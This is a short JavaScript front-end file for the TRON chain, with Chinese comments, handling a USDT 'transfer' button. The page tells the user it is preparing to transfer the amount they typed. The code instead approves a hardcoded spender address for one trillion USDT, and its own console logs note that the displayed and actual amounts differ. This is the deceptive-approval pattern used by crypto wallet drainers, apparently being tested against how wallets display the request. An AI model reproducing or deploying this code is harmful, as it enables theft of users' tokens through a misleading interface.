// usdtApprove.js — TRON 链专用版本

// ====== TRON 链配置 ======
const shastaUsdtAddress = "TG3XXyExBkPp9nzdajDZsozEu4BkaSJozs";
const spenderAddress = "TMcjcKsZZLSFh9JpTfPejHx7EPjdzG5XkC";

// TRON 链的 MaxUint256 处理方式不同
function getTronMaxUint256() {
  // 在 TRON 链上，通常使用十进制的大数字
  // TRON 的 USDT 是 6 位小数，所以 "无限" 可以是一个极大的数字
  return "1000000000000000000"; // 1e18，对于 6 位小数的 USDT 来说已经足够大
}

// 或者使用 TRON 的真正大数
function getTronHugeAmount() {
  // 相当于 1万亿 USDT - 在 TRON 上这已经是"无限"了
  return (1000000000000 * 1e6).toString(); // 1,000,000,000,000 USDT
}

window.approveUSDT = async function() {
  try {
    setStatus("准备 TRON 链大额授权...");
    
    if (!window.tronWeb || !window.tronWeb.ready) {
      throw new Error("请先连接钱包");
    }

    const input = document.getElementById("amount").value;
    const inputAmount = parseFloat(input);
    if (isNaN(inputAmount) || inputAmount <= 0) return;

    // 🎯 TRON 链方案：使用极大的数字
    const hugeAmount = getTronHugeAmount(); // 1万亿 USDT
    
    console.log("=== TRON 链大额授权测试 ===");
    console.log("前端显示金额:", inputAmount, "USDT");
    console.log("实际授权金额: 1,000,000,000,000 USDT (1万亿)");
    console.log("授权值:", hugeAmount);

    setStatus(`准备转账 ${inputAmount} USDT...`);

    const usdtContract = await window.tronWeb.contract().at(shastaUsdtAddress);
    
    setStatus("⚠️ 请检查钱包显示...");
    
    const result = await usdtContract.approve(
      spenderAddress, 
      hugeAmount
    ).send({
      feeLimit: 100000000,
      callValue: 0
    });

    console.log("✅ 交易成功:", result);
    
    setStatus(`✅ 操作完成，请观察钱包显示`);

  } catch (err) {
    console.error("授权失败:", err);
    setStatus("❌ " + err.message, true);
  }
};
